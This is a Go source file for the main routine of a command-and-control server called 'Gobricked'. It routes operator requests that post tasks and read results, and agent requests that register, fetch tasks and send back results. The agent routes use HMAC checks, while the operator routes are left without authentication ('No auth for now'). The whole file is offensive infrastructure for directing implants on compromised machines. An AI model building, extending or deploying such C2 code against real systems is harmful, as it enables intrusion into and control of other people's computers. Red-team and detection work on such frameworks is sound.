package main

import (
	"crypto/tls"
	"gobricked/pkg/middleware"
	"gobricked/pkg/router"
	"log"
	"net/http"

	"github.com/gorilla/mux"
)

// --------------------
// Main Server Logic
// --------------------

func main() {
	r := mux.NewRouter()

	// operator API endpoints (No auth for now--)
	r.HandleFunc("/results", router.GetResultHandler).Methods("GET")
	r.HandleFunc("/tasks", router.PostTaskHandler).Methods("POST")

	// ----- Agent API (secured by HMAC middleware) -----
	agentAPI := r.PathPrefix("/").Subrouter()
	agentAPI.Use(middleware.AgentHMACAuth)

	agentAPI.HandleFunc("/register", router.RegisterAgentHandler).Methods("POST")
	agentAPI.HandleFunc("/tasks/{agentID}", router.GetTasksHandler).Methods("GET")
	agentAPI.HandleFunc("/results", router.PostResultHandler).Methods("POST")

	tlsConfig := &tls.Config{
		MinVersion: tls.VersionTLS12,
	}

	server := &http.Server{
		Addr:      ":443",
		Handler:   r,
		TLSConfig: tlsConfig,
	}

	log.Println("[*] Gobricked C2 server listening on https://localhost:443")
	err := server.ListenAndServeTLS("server.crt", "server.key")
	if err != nil {
		log.Fatal(err)
	}
}
